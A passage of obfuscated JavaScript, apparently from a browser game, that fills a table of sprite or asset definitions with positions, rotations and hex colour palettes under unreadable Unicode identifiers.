			ⵠⲆ[Ⲇ.ⵠᐃΔΔΔᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ];
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ][Δⵠᐃ] = ⲆΔ.ⲆᐃⲆⲆⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ][1] = ⲆΔ.ⵠΔⲆⲆⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ][2] = ⲆΔ.ᐃΔⵠΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃΔⵠ] = ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃⲆΔ] = ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ][0] = ⲆΔ.ⲆᐃⲆᐃΔΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ][ⵠΔⲆ] = ⲆΔ.ⵠⲆⵠⲆΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ][2] = ⲆΔ.ⵠⲆᐃᐃⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⵠΔ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ][0] = ⲆΔ.ᐃⵠΔⵠⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ][1] = ⲆΔ.ⲆᐃⲆⲆⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ][2] = ⲆΔ.ΔᐃΔⲆᐃⵠΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆΔᐃΔ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔᐃ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ][Ⲇᐃⵠⵠ] = ⲆΔ.ᐃⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ][ΔΔᐃⵠ] = ⲆΔ.ᐃⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ][2] = ⲆΔ.ᐃⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⵠⵠᐃΔⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆᐃⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ][0] = ⲆΔ.ᐃⵠⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ][ᐃΔᐃⲆ] = ⲆΔ.ᐃⵠⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ][ⲆⵠΔΔ] = ⲆΔ.ᐃⵠⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠΔⲆᐃᐃΔ] = ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ΔΔᐃⲆⲆΔⵠ] = ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ][ΔⲆⲆ] = ⲆΔ.ⲆᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ][ΔᐃᐃⲆ] = ⲆΔ.ⲆᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ][2] = ⲆΔ.ⲆᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠⵠⲆΔΔ] = ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ];
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ][Ⲇᐃᐃᐃ] = ⲆΔ.ⲆᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ][1] = ⲆΔ.ⲆᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ][2] = ⲆΔ.ⲆᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⵠΔᐃ] = ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ][0] = ⲆΔ.ᐃⵠᐃⲆⲆΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ][ⲆⵠⲆⲆ] = ⲆΔ.ΔᐃⵠΔΔⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ][2] = ⲆΔ.ⵠᐃⲆᐃⵠΔⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⲆⵠ] = ⵠⲆ[Ⲇ.ⲆΔᐃⲆΔⵠᐃ];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ][ⵠⲆᐃⵠ] = ⲆΔ.ⲆΔⵠᐃⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ][1] = ⲆΔ.ΔⲆⲆΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ][2] = ⲆΔ.ⲆⵠⵠⲆⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⲆⵠᐃ] = ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ][ΔΔⵠⵠ] = ⲆΔ.ΔⵠⲆΔΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ][ⵠΔΔ] = ⲆΔ.ⵠΔⲆᐃᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ][Δⵠⵠⵠ] = ⲆΔ.ᐃΔΔⵠⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆΔⵠ] = ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠⵠⵠΔ] = ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ][0] = ⲆΔ.ΔΔⲆᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ][ΔⲆⵠ] = ⲆΔ.ΔᐃᐃΔᐃⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ][ΔⲆΔΔΔ] = ⲆΔ.ⵠⲆᐃⲆⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃⵠⲆⵠᐃᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ];
			ⵠⲆ[Ⲇ.ᐃⲆΔΔΔΔⵠ] = ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔΔ];
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ][0] = ⲆΔ.ΔΔΔΔⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ][ᐃⲆᐃ] = ⲆΔ.ᐃⵠΔⲆΔΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ][ΔⵠⵠΔ] = ⲆΔ.ᐃᐃⵠⵠΔΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆΔⲆ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⵠⲆⲆ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ][0] = ⲆΔ.ΔΔⵠⵠΔΔⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ][ⵠΔΔ] = ⲆΔ.ⲆⲆΔᐃᐃΔⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ][2] = ⲆΔ.ΔⵠΔⲆΔⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔΔΔᐃᐃᐃ] = ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃΔⲆ] = ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ][ⵠⲆⲆ] = ⲆΔ.ⵠⵠⵠⲆⲆⵠᐃⲆΔ;
			ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ][ΔⵠΔⵠ] = ⲆΔ.ᐃⵠΔΔΔᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ][ⵠⵠΔⲆ] = ⲆΔ.ᐃⵠⵠⵠᐃᐃⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⵠⲆ] = ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⵠᐃⵠ] = ⵠⲆ[Ⲇ.ΔⵠⲆΔΔⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ][0] = ⲆΔ.ⲆΔΔⵠⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ][1] = ⲆΔ.ⲆⲆⵠᐃΔⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ][2] = ⲆΔ.ⵠⵠⲆΔᐃΔⵠ;
			ⵠⲆ[Ⲇ.ΔΔⲆᐃⲆⵠⵠ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠΔⲆ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ][0] = ⲆΔ.ᐃⵠΔⲆΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ][ᐃᐃⵠ] = ⲆΔ.ΔᐃⲆᐃⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ][ⲆᐃᐃⲆ] = ⲆΔ.ⲆⵠⵠᐃⵠΔⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⲆΔ] = ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠΔΔ] = ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ][ⵠⲆⲆ] = ⲆΔ.ᐃᐃΔᐃᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ][1] = ⲆΔ.ᐃⵠᐃⲆΔⲆΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ][2] = ⲆΔ.ΔⲆⵠⲆⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠΔⲆᐃ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ];
			ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⲆᐃ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ][0] = ⲆΔ.ΔᐃⵠΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ][ⵠᐃⵠΔ] = ⲆΔ.ᐃᐃᐃΔᐃΔⲆ;
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ][2] = ⲆΔ.ⲆΔⵠᐃⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔΔ] = ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⵠⵠⲆΔ] = ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ][ⵠⲆⲆ] = ⲆΔ.ⲆⵠΔⲆΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ][ⵠⲆΔ] = ⲆΔ.ᐃⲆⲆᐃⵠⲆΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ][ΔⵠⵠΔ] = ⲆΔ.ᐃⵠΔⵠΔⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠⵠ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠΔᐃ];
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ][ⲆⲆⲆᐃ] = ⲆΔ.ΔΔⵠᐃᐃΔΔ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ][ΔⲆᐃᐃ] = ⲆΔ.ᐃⵠᐃⲆⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ][2] = ⲆΔ.ΔⲆΔⲆᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⲆⵠ] = ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃΔᐃⲆ] = ⵠⲆ[Ⲇ.ⵠⵠⵠᐃᐃΔⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⲆ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ⵠᐃΔᐃⵠⵠΔ,
				x: 0,
				y: 0,
				a: ⵠΔⵠΔ,
				r: ΔΔⵠⵠ,
				c: [ⵠ[111], "#515C57", "#3A4942", "#68736F", ⵠ[523], ⵠ[205], ⵠ[204], "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"]
			}, {
				f: ΔⵠᐃΔⵠᐃⲆ,
				x: ΔΔⵠⵠ,
				y: 0,
				a: 1,
				r: 0,
				c: ["#e4c027"]
			}], .14, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⲆⲆⵠ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠᐃⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆΔΔΔⲆⲆᐃ,
				x: ⵠⲆᐃⵠ,
				y: ⵠⲆᐃⵠ,
				a: ᐃᐃⲆΔ,
				r: 0,
				c: [ⵠ[111], ⵠ[24], ⵠ[237], "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"]
			}], .18, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⲆΔΔ] = ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆᐃⵠΔᐃΔⲆ,
				x: ⵠΔⲆⵠ,
				y: ⵠⲆⲆ,
				a: Ⲇᐃⵠ,
				r: 0,
				c: [ⵠ[111], ⵠ[197], ⵠ[347], "#261912", "#eee6c5", "#d1c599", ⵠ[197], ⵠ[347], "#86509b", "#703a99", "#ded4b4", "#d6ceab", "#c796c2", "#bc83b7", ⵠ[407], "#87519c", "#703e94", "#3eb67f", "#218f65", "#efe7c5", "#d093c4"]
			}], .32, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆⵠᐃⵠⲆΔ] = ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠⲆⵠ] = ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃⵠⲆⵠ] = ᐃⲆⲆᐃ(ⵠΔᐃ, [{
				f: ᐃΔⵠⵠᐃΔⲆ,
				x: 0,
				y: ΔᐃΔΔ,
				a: ΔⲆᐃᐃ,
				r: ΔΔⵠⵠ,
				c: [ⵠ[111], ⵠ[71], ⵠ[106], ⵠ[248], ⵠ[71]]
			}], .17, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⵠⲆ] = ⵠⲆ[Ⲇ.ⲆΔⵠᐃⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆⲆΔ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ΔⲆⵠΔΔᐃΔ,
				x: ⵠⵠΔⲆ,
				y: 0,
				a: ᐃᐃⲆΔ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[285], ⵠ[108], ⵠ[248], ⵠ[71], ⵠ[71], ⵠ[106], ⵠ[532], ⵠ[85]]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔᐃᐃ] = ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆⲆΔ];
			ⵠⲆ[Ⲇ.ⲆΔΔⲆⵠΔΔ] = ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔᐃΔ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠⵠⵠᐃⵠᐃ,
				x: ⲆΔΔⵠ,
				y: Δᐃᐃᐃ,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[285], ⵠ[108], "#765d42", ⵠ[532], ⵠ[85]]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔΔⵠᐃΔΔᐃ] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔᐃΔ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠⵠⵠⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠᐃᐃⲆⲆⲆⲆ,
				x: 2,
				y: 0,
				a: ⵠΔᐃ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[532], ⵠ[85], "#7a7575", "#454749", "#8c8787", ⵠ[24], ⵠ[237], "#aaa6a6"]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔΔⲆⵠΔⲆΔ] = ⵠⲆ[Ⲇ.ΔⲆⲆⵠⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔⵠ] = ᐃⲆⲆᐃ(Ⲇᐃⵠ, [{
				f: ᐃΔᐃΔⵠⵠΔ,
				x: Ⲇᐃᐃⵠ,
				y: ΔΔⵠ,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[400], ⵠ[330], "#a69e39", "#9c8828", "#bab143", ⵠ[104], ⵠ[193], "#d2ca59"]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⲆⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆΔⵠᐃ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ⵠᐃᐃᐃΔᐃᐃ,
				x: ΔⵠⵠΔ,
				y: ΔΔⵠⵠ,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], "#4ba8b4", "#198a82", "#6ccad7", ⵠ[226], ⵠ[448], "#7bd9e6"]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃⵠⵠ] = ⵠⲆ[Ⲇ.ᐃΔⵠⲆΔⵠᐃ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠΔΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⲆᐃⵠⲆⲆᐃ,
				x: ΔⵠᐃⲆ,
				y: ΔΔⵠⵠ,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], "#9443b1", "#6f1988", "#a752c6", "#9e35be", ⵠ[116], ⵠ[525]]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔⲆᐃΔ] = ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠΔΔ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ] = ᐃⲆⲆᐃ(ΔᐃᐃⲆ, [{
				f: ΔΔⲆⵠⲆΔΔ,
				x: ΔⵠᐃⲆ,
				y: 0,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"]
			}], .38, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃΔΔⵠ] = ᐃⲆⲆᐃ(ΔⲆᐃᐃ, [{
				f: ΔⵠᐃΔᐃ,
				x: ᐃⲆⵠᐃΔ,
				y: ΔᐃΔΔ,
				a: ΔΔᐃⵠ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[24], ⵠ[237]]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔΔⲆⲆΔΔⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⲆᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⲆΔ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ⵠⲆⵠⲆⲆⵠⲆ,
				x: 0,
				y: Δⵠᐃ,
				a: 1,
				r: Math.PI / ⵠⵠᐃⵠ,
				c: [ⵠ[111], ⵠ[24], ⵠ[237]]
			}], .3, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔⵠⲆᐃ] = ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⲆΔ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆᐃ] = ᐃⲆⲆᐃ(ⵠᐃⵠΔ, [{
				f: ΔⵠΔⲆⵠⲆⲆ,
				x: Ⲇᐃᐃⵠ,
				y: Δⵠᐃ,
				a: 1,
				r: Math.PI / ΔΔᐃⲆ,
				c: [ⵠ[111], "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb", "#42cc90"]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠΔⲆⵠ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃΔΔⵠⵠⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠᐃΔᐃ,
				x: 2,
				y: 0,
				a: 1,
				r: Math.PI / ⵠⲆᐃᐃ,
				c: [ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193]]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃᐃΔ] = ⵠⲆ[Ⲇ.ⵠᐃΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠᐃΔᐃ,
				x: ΔⵠⵠΔ,
				y: 0,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448]]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⵠⵠΔ] = ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃᐃⲆ] = ᐃⲆⲆᐃ(ΔᐃⲆⵠ, [{
				f: ΔⵠᐃΔᐃ,
				x: 2,
				y: ᐃⵠΔ,
				a: ΔᐃⲆⵠ,
				r: Math.PI / ᐃᐃⲆᐃ,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116]]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃΔΔᐃΔᐃ] = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ][0] = ⲆΔ.ⵠᐃⵠⵠⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ][1] = ⲆΔ.ΔΔΔΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ][2] = ⲆΔ.ⵠᐃⵠᐃᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃᐃⵠⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ];
